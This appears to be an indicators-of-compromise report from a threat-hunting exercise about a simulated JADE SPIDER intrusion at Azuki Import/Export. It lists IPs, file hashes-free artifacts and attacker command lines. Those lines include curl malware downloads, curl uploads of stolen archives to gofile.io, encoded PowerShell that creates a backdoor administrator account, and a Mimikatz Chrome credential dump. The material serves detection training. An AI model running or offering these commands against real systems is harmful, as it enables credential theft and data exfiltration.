# AZUKI BREACH Threat Hunt - Part 3: Indicators of Compromise (IOCs)

This document contains all Indicators of Compromise identified during the Part 3 threat hunt investigation of the JADE SPIDER intrusion at Azuki Import/Export Trading Co.

---

## Network Indicators

### External IP Addresses

| IP Address | Description | Context |
|------------|-------------|---------|
| 108.181.20.36 | Malware hosting | litter.catbox.moe |
| 45.112.123.227 | Exfiltration server | store1.gofile.io |

### Internal IP Addresses

| IP Address | Description | Context |
|------------|-------------|---------|
| 10.1.0.204 | AZUKI-SL | Lateral movement source (beachhead) |
| 10.1.0.188 | azuki-adminpc | Lateral movement target (CEO PC) |

### Domains

| Domain | Description |
|--------|-------------|
| litter.catbox.moe | Anonymous file hosting for malware staging |
| store1.gofile.io | Anonymous file hosting for data exfiltration |
| live.sysinternals.com | PsExec download source |

### URLs

| URL | Description |
|-----|-------------|
| https://litter.catbox.moe/gfdb9v.7z | Initial malware package (KB5044273-x64.7z) |
| https://litter.catbox.moe/mt97cj.7z | Credential theft tool (m-temp.7z) |
| https://store1.gofile.io/uploadFile | Data exfiltration endpoint |

---

## Host-Based Indicators

### Compromised Systems

| Device Name | IP Address | Role |
|-------------|------------|------|
| azuki-sl | 10.1.0.204 | IT admin workstation (beachhead) |
| azuki-fileserver01 | 10.1.0.188 | File server (Part 2) |
| azuki-adminpc | - | CEO administrative PC (Part 3 target) |

### Malicious Files

| Filename | Path | Description |
|----------|------|-------------|
| KB5044273-x64.7z | C:\Windows\Temp\cache\ | Malware archive disguised as Windows update |
| meterpreter.exe | C:\Windows\Temp\cache\ | Metasploit C2 beacon |
| silentlynx.exe | C:\Windows\Temp\cache\ | Custom JADE SPIDER implant |
| m.exe | C:\Windows\Temp\cache\ | Mimikatz (credential theft) |
| m-temp.7z | Current directory | Second Mimikatz download |
| PsExec64.exe | C:\Windows\Temp\cache\ | Sysinternals remote execution tool |
| 7z.exe | C:\Windows\Temp\cache\ | Archive extraction utility |

### Staging Directories

| Path | Description |
|------|-------------|
| C:\Windows\Temp\cache\ | Malware and tools staging |
| C:\ProgramData\Microsoft\Crypto\staging | Data collection staging |
| C:\ProgramData\Microsoft\Crypto\staging\Banking | Staged banking records |
| C:\ProgramData\Microsoft\Crypto\staging\Tax-Records | Staged tax documents |
| C:\ProgramData\Microsoft\Crypto\staging\Contracts | Staged contracts |
| C:\ProgramData\Microsoft\Crypto\staging\QuickBooks | Staged accounting data |

### Archives Created for Exfiltration

| Filename | Contents |
|----------|----------|
| credentials.tar.gz | Azuki-Passwords.kdbx, KeePass-Master-Password.txt |
| quickbooks-data.tar.gz | QuickBooks accounting data |
| banking-records.tar.gz | Banking documents |
| tax-documents.tar.gz | Tax records |
| contracts-data.tar.gz | Business contracts |
| chrome-credentials.tar.gz | Chrome saved passwords |
| chrome-session-theft.tar.gz | Chrome session cookies |
| Tax-Supporting-Docs-2024.zip | Tax supporting documents |
| All-Contracts-2022.zip | 2022 contracts archive |
| All-Contracts-2023.zip | 2023 contracts archive |

### Sensitive Files Accessed

| Filename | Path | Description |
|----------|------|-------------|
| OLD-Passwords.txt | C:\Users\yuki.tanaka\Desktop\ | Plaintext password file |
| KeePass-Master-Password.txt | Unknown | KeePass master password |
| Azuki-Passwords.kdbx | Unknown | KeePass database |
| Chrome Login Data | %localappdata%\Google\Chrome\User Data\Default\ | Chrome saved passwords |
| Chrome-Cookies.db | Unknown | Chrome session cookies |

### User Accounts

| Account | Type | Description |
|---------|------|-------------|
| yuki.tanaka | Compromised | Used for lateral movement to CEO PC |
| yuki.tanaka2 | Backdoor | Created by attacker, added to Administrators |

### Named Pipes

| Pipe Name | Process | Description |
|-----------|---------|-------------|
| \Device\NamedPipe\msf-pipe-5902 | meterpreter.exe | Metasploit C2 communication |

---

## Behavioral Indicators

### Command Line Patterns

**Malware Download:**
```
"curl.exe" -L -o C:\Windows\Temp\cache\KB5044273-x64.7z https://litter.catbox.moe/gfdb9v.7z
"curl.exe" -L -o m-temp.7z https://litter.catbox.moe/mt97cj.7z
```

**Archive Extraction (Password-Protected):**
```
"7z.exe" x C:\Windows\Temp\cache\KB5044273-x64.7z -p******** -oC:\Windows\Temp\cache\ -y
"7z.exe" x m-temp.7z -p******** -y
```

**Discovery Commands:**
```
"qwinsta.exe"
"quser.exe"
"nltest.exe" /domain_trusts /all_trusts
"NETSTAT.EXE" -ano
where /r C:\Users *.kdbx
```

**Base64-Encoded Account Creation:**
```
"powershell.exe" -EncodedCommand bgBlAHQAIAB1AHMAZQByACAAeQB1AGsAaQAuAHQAYQBuAGEAawBhADIAIABCAEAAYwBrAGQAMAAwAHIAMgAwADIANAAhACAALwBhAGQAZAA=
```
Decoded: `net user yuki.tanaka2 B@ckd00r2024! /add`

**Base64-Encoded Privilege Escalation:**
```
"powershell.exe" -EncodedCommand bgBlAHQAIABsAG8AYwBhAGwAZwByAG8AdQBwACAAQQBkAG0AaQBuAGkAcwB0AHIAYQB0AG8AcgBzACAAeQB1AGsAaQAuAHQAYQBuAGEAawBhADIAIAAvAGEAZABkAA==
```
Decoded: `net localgroup Administrators yuki.tanaka2 /add`

**Data Collection:**
```
"Robocopy.exe" C:\Users\yuki.tanaka\Documents\Banking C:\ProgramData\Microsoft\Crypto\staging\Banking /E /R:1 /W:1 /NP
"Robocopy.exe" C:\Users\yuki.tanaka\Documents\QuickBooks C:\ProgramData\Microsoft\Crypto\staging\QuickBooks /E /R:1 /W:1 /NP
"Robocopy.exe" C:\Users\yuki.tanaka\Documents\Tax-Records C:\ProgramData\Microsoft\Crypto\staging\Tax-Records /E /R:1 /W:1 /NP
"Robocopy.exe" C:\Users\yuki.tanaka\Documents\Contracts C:\ProgramData\Microsoft\Crypto\staging\Contracts /E /R:1 /W:1 /NP
```

**Data Compression:**
```
"tar.exe" -czf credentials.tar.gz Azuki-Passwords.kdbx KeePass-Master-Password.txt
"tar.exe" -czf quickbooks-data.tar.gz ...
"tar.exe" -czf banking-records.tar.gz ...
"tar.exe" -czf chrome-credentials.tar.gz chrome-creds.txt Chrome-Login-Data.db
```

**Browser Credential Theft:**
```
"m.exe" privilege::debug "dpapi::chrome /in:%localappdata%\Google\Chrome\User Data\Default\Login Data /unprotect" exit
```

**Data Exfiltration:**
```
"curl.exe" -X POST -F file=@credentials.tar.gz https://store1.gofile.io/uploadFile
"curl.exe" -X POST -F file=@quickbooks-data.tar.gz https://store1.gofile.io/uploadFile
"curl.exe" -X POST -F file=@banking-records.tar.gz https://store1.gofile.io/uploadFile
"curl.exe" -X POST -F file=@tax-documents.tar.gz https://store1.gofile.io/uploadFile
"curl.exe" -X POST -F file=@contracts-data.tar.gz https://store1.gofile.io/uploadFile
```

---

## Comparison: IOCs Across All Parts

| Category | Part 1 | Part 2 | Part 3 |
|----------|--------|--------|--------|
| External IP | 88.97.178.12 | 159.26.106.98 | N/A (used domains) |
| C2 Server | 78.141.196.6 | 78.141.196.6 | litter.catbox.moe |
| Staging Directory | C:\ProgramData\WindowsCache | C:\Windows\Logs\CBS | C:\ProgramData\Microsoft\Crypto\staging |
| Credential Tool | mm.exe (Mimikatz) | pd.exe (ProcDump) | m.exe (Mimikatz) |
| Exfiltration | Discord webhooks | file.io | gofile.io |
| Persistence | Scheduled task, support account | Registry Run key | yuki.tanaka2 account |
| C2 Implant | svchost.exe | svchost.ps1 | meterpreter.exe, silentlynx.exe |

---

## Threat Actor Attribution

The presence of `silentlynx.exe` in the malware toolkit provides strong attribution to JADE SPIDER, as "SilentLynx" is a known alias for this threat actor. Additional supporting evidence:

- Consistent use of living-off-the-land techniques
- Infrastructure rotation between operations
- Focus on financial and business data
- Targeting of logistics company (known JADE SPIDER victimology)

---

## Notes

These IOCs are specific to Part 3 of the JADE SPIDER intrusion observed at Azuki Import/Export Trading Co. during November 2025. The attacker demonstrated significant evolution in tactics, deploying a full Metasploit toolkit and custom implants while continuing to rotate exfiltration infrastructure.
